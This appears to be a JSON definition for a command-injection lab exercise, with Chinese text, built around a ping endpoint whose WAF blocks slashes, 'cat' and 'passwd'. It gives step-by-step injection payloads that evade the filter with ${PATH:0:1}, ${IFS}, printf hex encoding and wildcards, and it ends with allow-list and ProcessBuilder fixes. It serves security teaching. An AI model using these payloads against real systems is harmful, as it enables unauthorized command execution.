{
  "context": "rce_ping_b2",
  "title": "命令注入 · B2（斜杠/关键字被拦）",
  "goal": "绕过斜杠和关键字过滤，使用变量、编码、通配符执行命令",
  "vuln": {
    "summary": "VULN：WAF 拦截斜杠、cat、passwd，但未拦截变量和编码",
    "impact": [
      "命令注入：攻击者可以通过变量、编码、通配符绕过 WAF",
      "高级绕过：使用 Bash 变量、编码、通配符构造命令"
    ],
    "waf": {
      "blocked_chars": ["/"],
      "blocked_keywords": ["cat", "passwd"],
      "description": "WAF 拦截斜杠、cat、passwd"
    }
  },
  "exploit": {
    "steps": [
      {
        "step": 1,
        "title": "测试 WAF 拦截",
        "description": "尝试使用被拦截的斜杠和关键字",
        "payload": "127.0.0.1; cat /opt/lab/hosts",
        "expected": "WAF 拦截提示"
      },
      {
        "step": 2,
        "title": "使用 PATH 变量替代斜杠",
        "description": "使用 ${PATH:0:1} 获取斜杠",
        "payload": "127.0.0.1;cat${IFS}${PATH:0:1}opt${PATH:0:1}lab${PATH:0:1}hosts",
        "expected": "看到 /opt/lab/hosts 文件内容"
      },
      {
        "step": 3,
        "title": "使用 Printf 还原命令",
        "description": "使用 printf 输出十六进制字符还原 cat 命令",
        "payload": "127.0.0.1;$(printf '\\x63\\x61\\x74')${IFS}/opt/lab/hosts",
        "expected": "看到 /opt/lab/hosts 文件内容"
      },
      {
        "step": 4,
        "title": "使用通配符",
        "description": "使用通配符匹配命令和文件",
        "payload": "127.0.0.1;/???/?at${IFS}/???/lab/ho?ts",
        "expected": "看到 /opt/lab/hosts 文件内容"
      }
    ],
    "payloads": {
      "path_variable": [
        "127.0.0.1;cat${IFS}${PATH:0:1}opt${PATH:0:1}lab${PATH:0:1}hosts",
        "127.0.0.1;cat${IFS}${HOME:0:1}opt${HOME:0:1}lab${HOME:0:1}hosts"
      ],
      "printf": [
        "127.0.0.1;$(printf '\\x63\\x61\\x74')${IFS}/opt/lab/hosts",
        "127.0.0.1;$(echo -e \"\\x63\\x61\\x74\")${IFS}/opt/lab/hosts"
      ],
      "wildcard": [
        "127.0.0.1;/???/?at${IFS}/???/lab/ho?ts",
        "127.0.0.1;cat${IFS}/???/lab/ho?ts"
      ]
    }
  },
  "mitigation": {
    "title": "修复建议",
    "approaches": [
      {
        "name": "白名单验证",
        "description": "只允许 IP 地址格式，拒绝其他所有输入",
        "code": {
          "language": "java",
          "snippet": "if (!host.matches(\"^[0-9.]+$\")) {\n    throw new IllegalArgumentException(\"Invalid host\");\n}"
        }
      },
      {
        "name": "参数化执行",
        "description": "使用 ProcessBuilder 参数数组，避免 shell 解析"
      }
    ]
  },
  "tips": [
    "${PATH:0:1} 获取 PATH 环境变量的第一个字符（斜杠）",
    "printf 可以输出十六进制字符，还原命令",
    "通配符 ? 匹配单个字符，* 匹配多个字符",
    "关键字过滤容易被绕过，建议使用白名单验证"
  ],
  "common_mistakes": [
    "使用了被拦截的斜杠或关键字",
    "忘记对十六进制字符进行转义",
    "通配符匹配范围过大"
  ]
}
